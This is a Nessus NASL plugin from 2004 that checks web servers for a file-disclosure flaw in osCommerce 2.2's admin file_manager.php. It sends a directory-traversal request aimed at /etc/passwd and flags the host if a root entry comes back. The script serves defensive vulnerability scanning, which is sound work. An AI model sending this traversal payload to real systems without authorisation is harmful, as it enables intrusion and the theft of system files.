#
# This script was written by Noam Rathaus
#
# GPLv2
#
# From: Rene <l0om@excluded.org>
# Subject: oscommerce 2.2 file_manager.php file browsing
# Date: 17.5.2004 22:37

if(description)
{
  script_id(12242);
  script_version ("$Revision: 1.3 $");
  name["english"] = "File Disclosure in osCommerce's File Manager";
  script_name(english:name["english"]);
 
  desc["english"] = "
There is a vulnerability in the osCommerce's File Manager
that allows an attacker to retrieve arbitrary files
from the webserver that reside outside the bounding HTML root
directory.  

Risk factor : High";

  script_description(english:desc["english"]);
 
  summary["english"] = "Detect osCommerce's File Manager File Disclosure";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright(english:"This script is Copyright (C) 2004 Noam Rathaus");

  family["english"] = "General";
  script_family(english:family["english"]);
  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (! port) exit(0);
if(!get_port_state(port)) exit(0);


function check_dir(path)
{
	req = http_get(item:string(path, 
		"/admin/file_manager.php?action=download&filename=../../../../../../../../etc/passwd"), 
		port:port);
 	res = http_keepalive_send_recv(port:port, data:req);
	if ( res == NULL ) exit(0);
 	if(egrep(pattern:".*root:.*:0:[01]:.*", string:res))
 	{
  		security_warning(port);
  		exit(0);
 	}

}



foreach dir ( cgi_dirs() ) check_dir(path:dir);

